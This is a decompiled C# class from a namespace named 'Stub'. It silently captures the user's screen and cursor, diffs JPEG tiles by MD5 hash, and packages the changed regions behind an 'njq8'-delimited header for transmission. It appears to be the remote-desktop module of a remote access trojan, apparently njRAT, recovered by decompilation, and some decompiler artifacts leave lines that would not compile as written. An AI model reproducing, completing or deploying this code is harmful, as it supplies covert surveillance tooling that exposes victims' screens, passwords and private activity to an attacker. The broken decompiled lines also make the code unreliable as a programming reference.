using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub
{
	// Token: 0x0200002F RID: 47
	public class CRDP1
	{
		// Token: 0x060000D7 RID: 215 RVA: 0x00008F28 File Offset: 0x00007128
		[DebuggerNonUserCode]
		public CRDP1()
		{
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x00008F34 File Offset: 0x00007134
		private static Size QZ(int q)
		{
			Size result = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			checked
			{
				switch (q)
				{
				case 0:
					return result;
				case 1:
					result.Width = (int)Math.Round((double)result.Width / 1.1);
					result.Height = (int)Math.Round((double)result.Height / 1.1);
					break;
				case 2:
					result.Width = (int)Math.Round((double)result.Width / 1.3);
					result.Height = (int)Math.Round((double)result.Height / 1.3);
					break;
				case 3:
					result.Width = (int)Math.Round((double)result.Width / 1.5);
					result.Height = (int)Math.Round((double)result.Height / 1.5);
					break;
				case 4:
					result.Width = (int)Math.Round((double)result.Width / 1.9);
					result.Height = (int)Math.Round((double)result.Height / 1.9);
					break;
				case 5:
					result.Width = (int)Math.Round((double)result.Width / 2.0);
					result.Height = (int)Math.Round((double)result.Height / 2.0);
					break;
				case 6:
					result.Width = (int)Math.Round((double)result.Width / 2.1);
					result.Height = (int)Math.Round((double)result.Height / 2.1);
					break;
				case 7:
					result.Width = (int)Math.Round((double)result.Width / 2.2);
					result.Height = (int)Math.Round((double)result.Height / 2.2);
					break;
				case 8:
					result.Width = (int)Math.Round((double)result.Width / 2.5);
					result.Height = (int)Math.Round((double)result.Height / 2.5);
					break;
				case 9:
					result.Width = (int)Math.Round((double)result.Width / 3.0);
					result.Height = (int)Math.Round((double)result.Height / 3.0);
					break;
				case 10:
					result.Width = (int)Math.Round((double)result.Width / 3.5);
					result.Height = (int)Math.Round((double)result.Height / 3.5);
					break;
				case 11:
					result.Width = (int)Math.Round((double)result.Width / 4.0);
					result.Height = (int)Math.Round((double)result.Height / 4.0);
					break;
				case 12:
					result.Width = (int)Math.Round((double)result.Width / 5.0);
					result.Height = (int)Math.Round((double)result.Height / 5.0);
					break;
				case 13:
					result.Width = (int)Math.Round((double)result.Width / 6.0);
					result.Height = (int)Math.Round((double)result.Height / 6.0);
					break;
				}
				result.Width = Conversions.ToInteger(Strings.Mid(result.Width.ToString(), 1, result.Width.ToString().Length - 1) + Conversions.ToString(0));
				result.Height = Conversions.ToInteger(Strings.Mid(result.Height.ToString(), 1, result.Height.ToString().Length - 1) + Conversions.ToString(0));
				return result;
			}
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x000093E0 File Offset: 0x000075E0
		private static Image Gd(int Wi = 0, int He = 0, bool Sh = true)
		{
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			Bitmap bitmap = new Bitmap(width, height);
			Graphics graphics = Graphics.FromImage(bitmap);
			graphics.CompositingQuality = CompositingQuality.HighSpeed;
			Graphics graphics2 = graphics;
			int sourceX = 0;
			int sourceY = 0;
			int destinationX = 0;
			int destinationY = 0;
			int width2 = Screen.PrimaryScreen.Bounds.Width;
			Rectangle bounds = Screen.PrimaryScreen.Bounds;
			Size size = new Size(width2, bounds.Height);
			graphics2.CopyFromScreen(sourceX, sourceY, destinationX, destinationY, size, CopyPixelOperation.SourceCopy);
			if (Sh)
			{
				try
				{
					Cursor @default = Cursors.Default;
					Graphics g = graphics;
					Point position = Cursor.Position;
					size = new Size(32, 32);
					bounds = new Rectangle(position, size);
					@default.Draw(g, bounds);
				}
				catch (Exception ex)
				{
				}
			}
			graphics.Dispose();
			bool flag = Wi == 0 & He == 0;
			Image result;
			if (flag)
			{
				result = bitmap;
			}
			else
			{
				IntPtr callbackData;
				result = bitmap.GetThumbnailImage(Wi, He, null, callbackData);
			}
			return result;
		}

		// Token: 0x060000DA RID: 218 RVA: 0x0000950C File Offset: 0x0000770C
		private static string md5(byte[] bB)
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			bB = md5CryptoServiceProvider.ComputeHash(bB);
			return Convert.ToBase64String(bB);
		}

		// Token: 0x060000DB RID: 219 RVA: 0x00009538 File Offset: 0x00007738
		private static ImageCodecInfo GetEncoderInfo(string M)
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int num = 0;
			int num2 = imageEncoders.Length;
			int num3 = num;
			checked
			{
				for (;;)
				{
					int num4 = num3;
					int num5 = num2;
					if (num4 > num5)
					{
						goto Block_2;
					}
					bool flag = Operators.CompareString(imageEncoders[num3].MimeType, M, false) == 0;
					if (flag)
					{
						break;
					}
					num3++;
				}
				return imageEncoders[num3];
				Block_2:
				return null;
			}
		}

		// Token: 0x060000DC RID: 220 RVA: 0x00009594 File Offset: 0x00007794
		public static void Clear()
		{
			CRDP1.oQ = -1;
			CRDP1.oCo = -1;
			CRDP1.oQu = -1;
			CRDP1.OM = new Bitmap(1, 1);
		}

		// Token: 0x060000DD RID: 221 RVA: 0x000095B8 File Offset: 0x000077B8
		public static byte[] Cap(int q, int co, int Qu)
		{
			Size size = new Size((Point)CRDP1.QZ(q));
			checked
			{
				size.Width = Conversions.ToInteger(Strings.Mid(size.Width.ToString(), 1, size.Width.ToString().Length - 1) + Conversions.ToString(0));
				size.Height = Conversions.ToInteger(Strings.Mid(size.Height.ToString(), 1, size.Height.ToString().Length - 1) + Conversions.ToString(0));
				bool flag = CRDP1.OM.Size.Width != size.Width | CRDP1.OM.Height != size.Height | CRDP1.oCo != co | CRDP1.oQu != Qu;
				if (flag)
				{
					CRDP1.OA.Clear();
					CRDP1.OAA.Clear();
					CRDP1.OM = new Bitmap(size.Width, size.Height);
				}
				CRDP1.oQ = q;
				CRDP1.oCo = co;
				CRDP1.oQu = Qu;
				List<Bitmap> list = new List<Bitmap>();
				List<Point> list2 = new List<Point>();
				flag = (CRDP1.OA.Count > 0);
				Bitmap bitmap;
				if (flag)
				{
					list.AddRange(CRDP1.OA.ToArray());
					CRDP1.OA.Clear();
					list2.AddRange(CRDP1.OAA.ToArray());
					CRDP1.OAA.Clear();
					bitmap = CRDP1.OM;
				}
				else
				{
					bitmap = (Bitmap)CRDP1.Gd(size.Width, size.Height, true);
					int width = size.Width;
					int height = size.Height;
					int num = 0;
					int num2 = co - 1;
					int num3 = num;
					for (;;)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						int num6 = 0;
						int num7 = co - 1;
						int num8 = num6;
						for (;;)
						{
							int num9 = num8;
							num5 = num7;
							if (num9 > num5)
							{
								break;
							}
							int y = (int)Math.Round(unchecked((double)height / (double)co * (double)num3));
							int x = (int)Math.Round(unchecked((double)width / (double)co * (double)num8));
							int num10 = (int)Math.Round((double)width / (double)co);
							int num11 = (int)Math.Round((double)height / (double)co);
							flag = num10.ToString().Contains(".");
							if (flag)
							{
								num10 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num10), ".", -1, CompareMethod.Binary)[0]);
							}
							flag = num11.ToString().Contains(".");
							if (flag)
							{
								num11 = Conversions.ToInteger(Strings.Split(Conversions.ToString(num11), ".", -1, CompareMethod.Binary)[0]);
							}
							MemoryStream memoryStream = new MemoryStream();
							Bitmap bitmap2 = bitmap;
							Rectangle rect = new Rectangle(x, y, num10, num11);
							Bitmap bitmap3 = bitmap2.Clone(rect, bitmap.PixelFormat);
							Bitmap om = CRDP1.OM;
							rect = new Rectangle(x, y, num10, num11);
							Bitmap bitmap4 = om.Clone(rect, bitmap.PixelFormat);
							bitmap3.Save(memoryStream, ImageFormat.Jpeg);
							byte[] bB = memoryStream.ToArray();
							memoryStream.Dispose();
							memoryStream = new MemoryStream();
							bitmap4.Save(memoryStream, ImageFormat.Jpeg);
							byte[] bB2 = memoryStream.ToArray();
							memoryStream.Dispose();
							flag = (Operators.CompareString(CRDP1.md5(bB), CRDP1.md5(bB2), false) == 0);
							if (flag)
							{
								bitmap3.Dispose();
							}
							else
							{
								list.Add(bitmap3);
								List<Point> list3 = list2;
								Point item = new Point(x, y);
								list3.Add(item);
							}
							bitmap4.Dispose();
							num8++;
						}
						num3++;
					}
				}
				flag = (list.Count == 0);
				byte[] result;
				if (flag)
				{
					result = new byte[]
					{
						0
					};
				}
				else
				{
					int num12 = 0;
					List<int> list4 = new List<int>();
					int num13 = 0;
					int num14 = (int)Math.Round((double)(co * co) / 5.0);
					int num15 = num13;
					for (;;)
					{
						int num16 = num15;
						int num5 = num14;
						if (num16 > num5)
						{
							break;
						}
						flag = (num15 == list.Count);
						if (flag)
						{
							break;
						}
						list4.Add(num15);
						num12 += list[num15].Height;
						num15++;
					}
					Bitmap bitmap5 = new Bitmap(list[0].Width, num12);
					Graphics graphics = Graphics.FromImage(bitmap5);
					int num17 = 0;
					string text = Conversions.ToString(bitmap.Width) + "." + Conversions.ToString(bitmap.Height) + ",";
					try
					{
						foreach (int index in list4)
						{
							string[] array = new string[7];
							array[0] = text;
							array[1] = Conversions.ToString(list2[index].X);
							array[2] = ".";
							string[] array2 = array;
							int num18 = 3;
							Point item = list2[index];
							array2[num18] = Conversions.ToString(item.Y);
							array[4] = ".";
							array[5] = Conversions.ToString(list[index].Height);
							array[6] = ",";
							text = string.Concat(array);
							graphics.DrawImage(list[index], 0, num17);
							num17 += list[index].Height;
						}
					}
					finally
					{
						List<int>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					text += "njq8";
					int num19 = 0;
					int num20 = list.Count - 1;
					int num21 = num19;
					for (;;)
					{
						int num22 = num21;
						int num5 = num20;
						if (num22 > num5)
						{
							break;
						}
						flag = !list4.Contains(num21);
						if (flag)
						{
							CRDP1.OA.Add(list[num21]);
							CRDP1.OAA.Add(list2[num21]);
						}
						num21++;
					}
					graphics.Dispose();
					MemoryStream memoryStream2 = new MemoryStream();
					EncoderParameters encoderParameters = new EncoderParameters(1);
					encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, unchecked((long)Qu));
					ImageCodecInfo encoderInfo = CRDP1.GetEncoderInfo("image/jpeg");
					bitmap5.Save(memoryStream2, encoderInfo, encoderParameters);
					MemoryStream memoryStream3 = new MemoryStream();
					memoryStream3.Write(Encoding.Default.GetBytes(text), 0, text.Length);
					memoryStream3.Write(memoryStream2.ToArray(), 0, (int)memoryStream2.Length);
					CRDP1.OM = bitmap;
					bitmap5.Dispose();
					result = memoryStream3.ToArray();
				}
				return result;
			}
		}

		// Token: 0x040000C3 RID: 195
		private static List<Bitmap> OA = new List<Bitmap>();

		// Token: 0x040000C4 RID: 196
		private static List<Point> OAA = new List<Point>();

		// Token: 0x040000C5 RID: 197
		private static Bitmap OM = new Bitmap(1, 1);

		// Token: 0x040000C6 RID: 198
		private static int oQ = 0;

		// Token: 0x040000C7 RID: 199
		private static int oCo = 0;

		// Token: 0x040000C8 RID: 200
		private static int oQu = 0;
	}
}
